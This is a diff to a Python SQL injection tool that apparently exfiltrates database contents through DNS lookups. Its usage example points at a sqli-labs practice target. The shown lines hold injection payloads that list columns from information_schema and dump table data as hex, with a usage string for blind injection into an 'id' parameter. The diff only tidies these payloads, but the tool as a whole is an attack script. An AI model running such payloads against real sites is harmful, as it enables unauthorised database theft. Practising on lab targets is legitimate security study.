@@ -21,7 +21,6 @@ class DnsSql(object):
 	def __init__(self, options):
 		self.APItoken = APItoken
 		self.DNSurl = DNSurl
-		# self.queue = Queue()
 		self.options = options
 		self.injUrl = options.url
 		self.taskname = options.taskname
@@ -48,7 +47,7 @@ class DnsSql(object):
 		
 		if self.table:
 			self.tableP = '0x'+self.table.encode('hex')
-			self.columnPayload = "select hex(column_name )from information_schema.columns where table_name={table}".format(table=self.tableP)
+			self.columnPayload = "select hex(column_name)from information_schema.columns where table_name={table}".format(table=self.tableP)
 		
 		if self.column:
 			self.dataPayload = "select hex(concat_ws(0x3a,{column})) from {db}.{table}".format(db=self.db,table=self.table,column=self.column)
@@ -246,7 +245,7 @@ if __name__ == '__main__':
 	banner()
 
 	print '[-]{}\n'.format(start_time)
-	parser = optparse.OptionParser("usage: %prog [options] http://10.211.55.9/sqli-labs/Less-1/?id=' union select 1,({}),3--+", version="%prog 1.1")
+	parser = optparse.OptionParser("usage: %prog [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+", version="%prog 1.1")
 	parser.add_option("-n","--name", dest='taskname', default='dnsloginj',  help="task name")
 	parser.add_option("-t","--thread", dest='thread_count', default='5',  help="thread_count")
 	parser.add_option("-u","--url", dest='url', default='',  help="target include injection")
